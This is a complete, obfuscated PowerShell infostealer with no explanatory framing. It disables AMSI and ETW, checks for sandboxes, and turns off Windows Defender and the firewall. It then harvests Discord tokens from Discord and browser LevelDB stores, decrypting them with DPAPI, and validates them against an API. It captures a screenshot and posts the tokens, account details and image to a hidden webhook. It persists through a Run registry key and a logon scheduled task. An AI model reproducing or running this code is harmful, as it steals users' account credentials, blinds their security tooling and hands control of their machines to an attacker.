# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
$Uz3VzM = [int](3095) % 256
$KWBr = (-join([byte[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73)|%{[char]$_}))
$SLDW = "WAUJZ"
$zHaaMDL = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$IjUD = [Ref].Assembly.GetType($KWBr)
Start-Sleep -Milliseconds 9
$d1cqt0tP = $IjUD.GetField($zHaaMDL, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uUHVibGljLFN0YXRpYw==")))
$d1cqt0tP.SetValue($null, $true)
$uFfs = [int](2171) % 256

# ETW blind (P/Invoke)
$fgjTI = "KHJQE"
$Ms9Imu = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$QlpT = Add-Type -MemberDefinition $Ms9Imu -Name 'ParseEntry9' -Namespace 'ProcessEntry93' -PassThru
$cYJoN1 = "TCDQZ"
$s1rP = (-join([byte[]](0x6e,0x74,0x64,0x6c,0x6c,0x2e,0x64,0x6c,0x6c)|%{[char]$_}))
$VEN1z = (-join([byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6e,0x74,0x57,0x72,0x69,0x74,0x65)|%{[char]$_}))
$SkW8 = $QlpT::LoadLibrary($s1rP)
$n6sVPnyV = $QlpT::GetProcAddress($SkW8, $VEN1z)
$KIFMa = [int](4711) % 256
$QDBwt = 0
$QlpT::VirtualProtect($n6sVPnyV, [UIntPtr]::new(1), 0x40, [ref]$QDBwt) | Out-Null
$yxCm9H = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($yxCm9H, 0, $n6sVPnyV, $yxCm9H.Length)
$QlpT::VirtualProtect($n6sVPnyV, [UIntPtr]::new(1), $QDBwt, [ref]$QDBwt) | Out-Null
$qOSLAa = [int](2495) % 256

# Environment validation
$v5ks5 = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($v5ks5 -lt 2) { exit }
$RACYaGf = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($RACYaGf -lt 2GB) { exit }
$VnEWt3Tt = [System.DateTime]::Now
Start-Sleep -Milliseconds 3177
if (([System.DateTime]::Now - $VnEWt3Tt).TotalMilliseconds -lt 2541) { exit }

function ProcessItem85($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        (ProcessItem85 @(64,147,191,236) @(33,196,233,216,14,65)),
        (ProcessItem85 @(79,131,217,152,15,125,247,188,173,6,116,170,181,199,58,57) @(4,198,236,244,107)),
        (ProcessItem85 @(230,148,92,236,254,149,110,176,235,146,68,175,211,174,92,169,214,186,97,225) @(178,249,10,220)),
        (ProcessItem85 @(133,134,30,195,101,162,167,161,152,112,162,83,171,151,157,177,69,157,100,242) @(215,193,39,240,7,207,223)),
        (ProcessItem85 @(235,89,244,178,200,35,187,105,195,96,255,171,224,88,163,118,196,99,165,179,205,51,187,113,196,77,218,236,207,89,191,103,249,40,169,168,200,44,191,107,196,89,165,183,206,89,217,104,195,40,214,175,207,89,129,118,194,78,213,164,225,17,172,105,238,99,161,170,205,51,129,114,194,89,169,167,206,89,221,104,194,77,214,173,206,2,208,100,194,40,164,168,207,35,164,102,234,99,251,224) @(160,26,144,221,172,107,233,30))
    )
    return ($s -join '') + ([char]0x20+[char]0x23) + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$hook = (ProcessItem85 @(50,35,131,29,157,29,191,101,39,168,20,149,52,170,29,1,179,30,180,62,190,62,37,167,79,173,108,154,48,44,186,91,154,103,164,58,10,150,20,136,52,193,30,29,156,121,171,47,189,23,34,169,99,186,12,199,30,1,132,24,176,63,171,42,38,133,96,132,24,155,106,25,131,123,191,44,165,21,61,130,76,170,31,128,49,47,135,94,176,59,164,25,62,188,73,147,13,194,59,45,133,117,154,1,165,63,61,168,79,182,3,131,50,17,135,97,173,18,153,41,61,153,69,148,7,192,29,6,131,71,188,58,151,11,34,224,78,147,31,164,48,45,155,103,178,13,167,39,36,133,127,179,55,136,9,3,133,120,146,58,160,18,86,236) @(83,107,209,45,254,85,242))
$api = (ProcessItem85 @(87,63,162,67,85,63,189,69,122,14,201,24,87,47,190,25,84,68,186,24,122,26,190,5,84,36,201,27,85,48,155,5,82,29,155,5,82,47,190,31,85,25,189,5,103,48,193,31) @(54,119,240,115))
$rgx = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa = 'mfa\.[\w-]{84}'
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq (ProcessItem85 @(106,199,105,34,158,81,223,107,248,125,124,156,84,223,108,241,96,3,129,93,220,15,249,126,17,158,58,180) @(62,171,56,69,207,7,137)))
$firstRun = $true

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @((ProcessItem85 @(212,196,144,73,15,214,183,250,166,114,107,217) @(142,131,252,51,86,228)), (ProcessItem85 @(250,63,83,44,235,154,153,1,101,17,252,192,194,21,121,47,215,249,157,69) @(160,120,63,86,178,168)), (ProcessItem85 @(200,124,188,106,95,97,131,235,97,152,82,54,10,221,175,6) @(146,59,208,16,6,83,186)), (ProcessItem85 @(61,222,249,39,90,110,48,191,61,222,199,49,103,49,95,181,5,170,215,41,89,11,60,246) @(103,153,149,93,3,92,9,198)))
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA ($d + (ProcessItem85 @(188,118,126,144,213,136,162,64,79,160,194,138,134,0,76,142,214,136,178,80,100,161,218,136,190,100,126,141,213,221,217,14) @(228,51,6,230,140,186)))
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = ($env + (ProcessItem85 @(65,211,3,74,25,67,72,245,42,76,10,34,92,253,61,79,25,37,118,240,25,40,113,29,108,255,45,121,25,65,102,193,25,40,121,31,86,254,45,96,18,43,71,223,41,93,14,67,87,233,70,39) @(14,184,123,26,72,115))); Default = (ProcessItem85 @(185,98,217,23,235,179,115,252,30,243,214,24) @(235,37,143,122,178)) },
        @{ Path = ($env + (ProcessItem85 @(222,164,35,137,87,31,49,220,158,13,155,87,125,50,215,154,10,143,126,97,22,198,129,34,187,53,97,1,203,161,9,186,84,120,37,255,149,13,161,80,76,69,199,182,18,156,84,71,19,214,138,102) @(145,207,91,217,6,47,119))); Default = (ProcessItem85 @(187,215,24,193,173,97,247,154,244,15,145,201) @(233,144,78,172,244,57,161)) },
        @{ Path = ($env + (ProcessItem85 @(223,68,185,159,111,16,208,151,193,121,131,158,108,101,208,143,193,121,185,140,93,77,208,232,202,121,143,185,100,78,196,233,201,119,139,163,102,101,220,163,201,119,155,163,114,117,220,163,242,28,165,181,100,120,220,185,198,119,143,163,93,73,212,159,201,119,147,167) @(144,47,193,207,62,32,150,218))); Default = (ProcessItem85 @(21,215,196,211,64,172,17,227,246,255,36,201) @(71,144,146,190,25,244)) },
        @{ Path = ($env + (ProcessItem85 @(107,27,87,205,112,69,107,66,117,38,109,204,115,48,107,90,117,38,87,202,64,45,119,103,70,55,125,237,121,51,123,117,126,40,102,250,115,50,107,63,125,33,18,160) @(36,112,47,157,33,117,45,15))); Default = (ProcessItem85 @(117,196,72,44,125,112,208,187,67,194,35,124) @(39,131,30,65,36,40,134,200)) }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq (ProcessItem85 @(184,194,109,249,199,178,211,72,240,223,215,184) @(234,133,59,148,158)) -or $_.Name -like (ProcessItem85 @(225,79,65,15,117,51,22,199,93,88,56,94) @(180,7,11,121,47,94,122))
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName (ProcessItem85 @(144,144,237,69,214,115,233,163,130,231,125,249,71,243,130,185,142,121,247,87,196,156,141,184,77,200,118,247) @(196,215,212,47,143,36,158))
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso = [System.Text.Encoding]::GetEncoding((ProcessItem85 @(33,177,234,109,34,154,129,148,60,179,207,73,35,159,219,157) @(114,231,164,61,110,206,230,160)))
    $dpapiMagic = (ProcessItem85 @(248,21,199,113,173,248,105,187) @(185,84,134,48,236))
    $regexObj = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                (ProcessItem85 @(97,34,251,239,110,220,219,117,32,135,213,120,209,171,10,71) @(55,122,181,131,13,181,234))  = (ProcessItem85 @(139,184,227,114,197,25,153,174,134,188,226,117,232,36,160,186,148,169,190,52,198,35,179,171,187,220,151,35,240,34,176,186,146,187,155,49,233,10,146,186,137,221,182,49,234,36,176,234,150,167,189,118,234,13,138,224) @(223,239,218,68,164,78,225,221))
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u    = ($($r.username) + "#" + $($r.discriminator))
                    id   = $r.id
                    em   = if ($r.email) { $r.email } else { (ProcessItem85 @(108,4,244,79) @(56,109,205,13,95)) }
                    ph   = if ($r.phone) { $r.phone } else { (ProcessItem85 @(195,202,43,151) @(151,163,18,213,158,105)) }
                    ni   = switch ($r.premium_type) { 1 { (ProcessItem85 @(200,201,88,47,237,60,215,139,121,48,179,50) @(153,251,32,71,142,15)) } 2 { (ProcessItem85 @(35,27,103,197,31,82,189,32) @(119,118,11,245,124,63,133,29)) } default { (ProcessItem85 @(161,55,119,125,170,36,200,103) @(245,90,78,8,240,117)) } }
                    mf   = if ($r.mfa_enabled) { (ProcessItem85 @(106,8,227,47) @(61,95,181,85,198)) } else { ([char]0x4e+[char]0x6f) }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $report = ((ProcessItem85 @(113,85,255,224,108,80,217,207,108,122,217,209,104,111,205,202,111,87,201,193,107,87,217,209,98,111,224,243,121,80,205,198,117,85,206,191) @(58,60,143,130)) + $env + (ProcessItem85 @(42,153,170,135,183,51,176,178,129,166,51,161,176,188,165,43,160,181,167,181,6,192,178,174,172,12,179,217) @(101,242,228,215,227)) + $env + (ProcessItem85 @(121,154,141,131,159,96,188,148,134,152,7,176,152,187,151,94,148,156,187,166,127,176,137,161,172,4,160,174,180,183,89,145) @(54,246,219,215,205)) + $($validTokens.Count) + (ProcessItem85 @(180,91,116,154) @(247,60,27,167,206,177)))
    
    # Build token list
    foreach ($ti in $validTokens) {
        $report += (([char]0x2a+[char]0x2a) + $($ti.u) + (ProcessItem85 @(22,185,1,84,11,151,87,109,7,135,90,41,20,151,47,34) @(93,208,110,31)) + $($ti.token) + (ProcessItem85 @(128,141,144,217,249,157,163,135) @(217,204,224,147,171)) + $($ti.id) + (ProcessItem85 @(200,218,153,125,210,230,163,122,196,216,142,52) @(139,177,207,9)) + $($ti.em) + (ProcessItem85 @(249,102,89,163,183,245,143,102,84,165,148,250) @(186,10,27,204,213,199)) + $($ti.ph) + (ProcessItem85 @(114,102,94,147,85,69,33,149,125,61,90,164,96,89,4,132) @(49,13,107,227)) + $($ti.ni) + "/" + $($ti.mf) + (ProcessItem85 @(148,141,211,40) @(215,234,188,21,73,210,71)))
    }

    # Send main message
    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
    } catch {}

    # Send screenshot if exists
    if ($bytes) {
        try {
            $boundary = (ProcessItem85 @(52,211,0,187,181,20,118,98,26,200,98,254,154,47,122,16,26,179,102,186,163,5,106,42,29,209,13,242) @(120,128,48,207,249,66,44,83)) + (Get-Random).ToString()
            $LF = (ProcessItem85 @(161,27,98,184) @(229,74,13,133,184,37,93,96))
            $body = (
                (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + $LF) +
                ((ProcessItem85 @(146,143,156,163,167,250,243,163,167,254,148,147,162,229,235,161,161,142,235,166,167,250,201,160,161,215,202,177,153,208,156,175,161,238,148,189,154,229,247,190,140,196,231,163,154,234,148,186,147,234,228,191,153,208,201,165,153,234,228,225,138,250,255,166,161,250,243,163,154,234,148,186,147,234,228,191,160,143,235,175,153,234,243,163,160,143,205,160,167,254,144,161,161,208,193,177,138,218,152,235) @(195,189,165,214)) + $LF) +
                ((ProcessItem85 @(5,186,183,199,67,78,1,121,48,203,191,231,66,81,21,96,27,225,204,194,69,94,17,98,14,219,183,197,69,100,52,49) @(84,136,142,178,39,9,87,12)) + $LF + $LF)
            )
            $footer = ($LF + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + ([char]0x2d+[char]0x2d) + $LF)
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = (ProcessItem85 @(195,1,64,114,192,5,68,27) @(150,68,121,38))
            $webRequest.ContentType = ((ProcessItem85 @(25,169,20,12,109,116,105,78,34,169,8,79,69,1,95,79,24,156,114,11,83,116,67,9,34,165,49,24,80,94,60,8,25,156,16,23,106,93,110,0) @(123,241,66,127,9,51,5,57)) + $boundary)
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = (ProcessItem85 @(231,218,227,122,171,107,44,254,252,157,31,130,81,37,177,241,191,14,164,84,42,211,168,172,43,182,10,8,230,228,155,61,171,107,39,227,196,180,37,134,106,62,202,231,147,10,192,0,47,195,245,170,19,182,97,10,230,244,155,61,168,74,36,227,212,183,37,157,86,37,236,237,185,36,193,84,44,182,245,234,45,185,113,28,203,244,226,63,146,94,32,183,209,183,45,129,87,33,236,172,131,39,167,73,60,220,215,176,43,195,6,86,222,202,239,121,189,94,40,242,255,137,112,139,106,49,240,231,187,14,183,71,43,208,212,160,4,165,114,85,200,197,152,57,148,116,48,247,209,233,7,135,81,15,189,233,131,30,157,70,42,183,211,172,43,152,6,17,231,231,159,39,186,100,39,237) @(132,157,218,73,241,51,102))
Set-ItemProperty -Path (ProcessItem85 @(16,130,121,161,152,23,183,110,176,252,122,170,105,173,170,43,164,96,179,173,23,144,97,143,173,46,254,119,135,252,25,247,85,163,170,51,165,96,183,184,39,244,67,134,159,112,145,116,134,163,21,178,105,163,148,47,164,99,171,190,33,245,56,134,155,45,145,120) @(67,199,13,229,206)) -Name (ProcessItem85 @(63,66,158,236,244,40,208,117,10,65,188,245,247,92,191,63,8,40,160,172,253,40,191,46,11,56,160,246) @(105,112,242,153,174,111,233,70)) -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn (ProcessItem85 @(130,124,240,90,152,153,77,231,45,173,97,174,135,71,130,55,253,119,144,235,39,147,24,244,77,138,140,27) @(212,78,156,47,194,222,116)) /tr ($cmd) /sc onlogon /f /rl highest /it > $null 2>&1

# === INSTANT EXIT ===
exit
